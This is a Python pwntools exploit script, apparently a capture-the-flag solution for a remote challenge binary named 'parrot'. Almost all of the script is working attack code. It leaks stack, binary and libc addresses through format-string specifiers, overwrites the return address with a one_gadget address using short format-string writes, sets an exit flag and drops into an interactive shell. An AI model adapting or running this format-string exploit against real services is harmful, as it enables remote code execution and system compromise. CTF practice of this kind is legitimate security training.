#!/usr/bin/env python3

from time import sleep
from pwn import *
from easypy import *

e = ELF("parrot_patched")

context.binary = e

libc = e.libc

def local():
    p = process([e.path])
    gdb.attach(p)
    return p

def conn():
    r = remote('sie2op7ohko.hackday.fr', 1341)
    return r


def launch(r):
    r.recvuntil(b'> ')

    def leak(s):
        r.sendline(s)
        return int(r.recvuntil(b'> ').decode().split('\n')[0], 16)

    base, ret, libc_leak = map(leak, [b'%8$p', b'%11$p', b'%21$p'])
    base -= 0x40
#    ret  += 0x21 # __libc_start_main+243
    binsh = libc_leak + 0x19050a # "/bin/sh\0"

    should_exit = base + 0x4029
#    s           = base + 0x11d9
#    pop_rdi_ret = base + 0x124b
#    pop_rax_ret = base + 0x11e0
#    print(f'se = {hex(should_exit)}')

#    chain = [pop_rdi_ret, binsh, pop_rax_ret, 0x3b, s]
#    print(f'pop_rdi_ret = {hex(pop_rdi_ret)}')

    one_gadget = 0xe3b31 + (binsh-0x1b45be+1) # offset + libc.address
    chain = [one_gadget]
    for i, data in enumerate(chain):
        for j in range(3):
            short = (data >> j*4*4) & 0xffff
#            print(f'short#{i}.{j} = {hex(short)}')
            r.sendline(fmtstr_payload(6, {ret+8*i+2*j: short}, write_size='short'))
            r.recvuntil(b'> ')

#    gdb.attach(r, f"""
#               bp {hex(one_gadget)}
#               set *{hex(should_exit)} = 1
#               continue""")
    r.sendline(fmtstr_payload(6, {should_exit: 1})) # lets goooo

    r.clean()
    r.interactive()

def main():
    r = conn()
#    r = e.process()

    launch(r)


if __name__ == "__main__":
    main()
